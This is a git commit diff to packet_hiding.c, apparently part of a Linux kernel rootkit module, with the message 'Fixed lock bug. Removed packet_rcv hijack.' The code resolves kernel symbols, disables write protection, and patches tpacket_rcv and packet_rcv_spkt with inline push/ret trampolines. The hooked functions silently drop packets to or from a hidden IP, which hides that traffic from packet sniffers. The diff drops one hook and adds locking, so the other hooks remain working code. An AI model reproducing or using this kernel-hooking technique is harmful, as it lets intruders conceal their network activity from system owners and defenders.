b39aa536bc0c5a123c9277b2fc184b921e3347b3
Nicolas Appel <appeln@in.tum.de>
2014-01-13 15:35:19 +0100

    Fixed lock bug. Removed packet_rcv hijack.

--- packet_hiding.c
+++ packet_hiding.c
@@ -21,18 +21,13 @@
 /*
 *	Functions and addresses for hijacking
 */
-static unsigned long *tpacket_rcv_addr, *packet_rcv_addr,*packet_rcv_spkt_addr;
+static unsigned long *tpacket_rcv_addr, *packet_rcv_spkt_addr;
 static int (*tpacket_rcv)(struct sk_buff*, struct net_device*,
-			  struct packet_type*, struct net_device*);
-static int (*packet_rcv)(struct sk_buff*, struct net_device*,
 			  struct packet_type*, struct net_device*);
 static int (*packet_rcv_spkt)(struct sk_buff*, struct net_device*,
 			  struct packet_type*, struct net_device*);
 
 static int my_tpacket_rcv(struct sk_buff*, struct net_device*,
-			  struct packet_type*, struct net_device*);
-
-static int my_packet_rcv(struct sk_buff*, struct net_device*,
 			  struct packet_type*, struct net_device*);
 
 static int my_packet_rcv_spkt(struct sk_buff*, struct net_device*,
@@ -44,23 +39,22 @@ static int check_packet(struct sk_buff*);
 /*
 *	Original 6 bytes of the hijacked functions
 */
-char tpacket_rcv_code[HIJACK_LEN];
-char packet_rcv_code[HIJACK_LEN];
-char packet_rcv_spkt_code[HIJACK_LEN];
+static char tpacket_rcv_code[HIJACK_LEN];
+static char packet_rcv_spkt_code[HIJACK_LEN];
 
 /*
 *	Injected code used for hijacking:
 *	pushq $0xADDRESS
 *	retq
 */
-char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
-unsigned int *p_addr = (unsigned int*) (hjc+1);
+static char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
+static unsigned int *p_addr = (unsigned int*) (hjc+1);
 
 /*
 *	IP hiding stuff
 */
-char * hidden_ip_str = "000.000.000.000";
-unsigned int hidden_ip = 0;
+static char * hidden_ip_str = "000.000.000.000";
+static unsigned int hidden_ip = 0;
 
 /*
 *	Module Parameters
@@ -78,7 +72,7 @@ union address_conv_t {
 } adc;
 
 
-spinlock_t hijack_lock;
+static spinlock_t hijack_lock = __SPIN_LOCK_UNLOCKED(hijack_lock);
 
 /*
 * 	Convert IP string to integer
@@ -105,9 +99,9 @@ unsigned int ipstr_to_int(char* ip_str)
 *	
 */
 void hijack_tpacket_rcv(void){
-	spin_lock(&hijack_lock);
 	adc.d64 = (unsigned long) my_tpacket_rcv;
 	*p_addr = adc.d32[0];
+	spin_lock(&hijack_lock);
 	memcpy(tpacket_rcv_code, tpacket_rcv_addr, HIJACK_LEN); //save old code
 	dp();
 	memcpy(tpacket_rcv_addr, &hjc, HIJACK_LEN); //inject our code
@@ -123,9 +117,11 @@ static int my_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	int ret;
 	printk(KERN_INFO "tpacket_rcv\n");
 	if(check_packet(skb)) return 0;
+	spin_lock(&hijack_lock);
 	dp();
 	memcpy(tpacket_rcv_addr, tpacket_rcv_code, HIJACK_LEN);
 	wp();
+	spin_unlock(&hijack_lock);
 	ret = tpacket_rcv(skb,dev,pt,orig_dev);
 	hijack_tpacket_rcv();
 	return ret;
@@ -134,31 +130,10 @@ static int my_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 /*
 *	The following functions are just the same. Go to line 180
 */
-void hijack_packet_rcv(void){
-	spin_lock(&hijack_lock);
-	adc.d64 = (unsigned long) my_packet_rcv;
-	*p_addr = adc.d32[0];
-	memcpy(packet_rcv_code, packet_rcv_addr, HIJACK_LEN);
-	dp();
-	memcpy(packet_rcv_addr, &hjc, HIJACK_LEN);
-	wp();
-	spin_unlock(&hijack_lock);
-}
-static int my_packet_rcv(struct sk_buff *skb, struct net_device *dev,
-			  struct packet_type *pt, struct net_device *orig_dev){
-	int ret;
-	printk(KERN_INFO "packet_rcv\n");
-	if(check_packet(skb)) return 0;
-	dp();
-	memcpy(packet_rcv_addr, packet_rcv_code, HIJACK_LEN);
-	wp();
-	ret = packet_rcv(skb,dev,pt,orig_dev);
-	hijack_packet_rcv();
-	return ret;
-}
 void hijack_packet_rcv_spkt(void){
 	adc.d64 = (unsigned long) my_packet_rcv_spkt;
 	*p_addr = adc.d32[0];
+	spin_lock(&hijack_lock);
 	memcpy(packet_rcv_spkt_code, packet_rcv_spkt_addr, HIJACK_LEN);
 	dp();
 	memcpy(packet_rcv_spkt_addr, &hjc, HIJACK_LEN);
@@ -170,9 +145,11 @@ static int my_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev,
 	int ret;
 	printk(KERN_INFO "packet_rcv_spkt\n");
 	if(check_packet(skb)) return 0;
+	spin_lock(&hijack_lock);
 	dp();
 	memcpy(packet_rcv_spkt_addr, packet_rcv_spkt_code, HIJACK_LEN);
 	wp();
+	spin_unlock(&hijack_lock);
 	ret = packet_rcv_spkt(skb,dev,pt,orig_dev);
 	hijack_packet_rcv_spkt();
 	return ret;
@@ -204,28 +181,24 @@ void hide_packets(void){
 	printk(KERN_INFO "===================================\n");
 	hidden_ip = ipstr_to_int(hidden_ip_str);
 	printk(KERN_INFO "IP: %s, %u\n", hidden_ip_str, hidden_ip);
-	packet_rcv_addr = (unsigned long* )kallsyms_lookup_name("packet_rcv");
 	packet_rcv_spkt_addr = (unsigned long* )kallsyms_lookup_name("packet_rcv_spkt");
 	tpacket_rcv_addr = (unsigned long* )kallsyms_lookup_name("tpacket_rcv");
 	
-	packet_rcv = (int (*)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*))packet_rcv_addr;
 	packet_rcv_spkt = (int (*)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*))packet_rcv_spkt_addr;
 	tpacket_rcv = (int (*)(struct sk_buff*, struct net_device*, struct packet_type*, struct net_device*))tpacket_rcv_addr;
 
 	hijack_tpacket_rcv();
-	hijack_packet_rcv();
 	hijack_packet_rcv_spkt();
 	
-//	printk(KERN_INFO "0x%p\n", packet_rcv_addr);
-//	printk(KERN_INFO "0x%p\n", tpacket_rcv_addr);
 }
 /*
 *	Reset all function headers and break the hijacking chain.
 */
 void unhide_packets(void){
+	spin_lock(&hijack_lock);
 	dp();
 	memcpy(tpacket_rcv_addr, tpacket_rcv_code, HIJACK_LEN);
-	memcpy(packet_rcv_addr, packet_rcv_code, HIJACK_LEN);
 	memcpy(packet_rcv_spkt_addr, packet_rcv_spkt_code, HIJACK_LEN);
 	wp();
+	spin_unlock(&hijack_lock);
 }
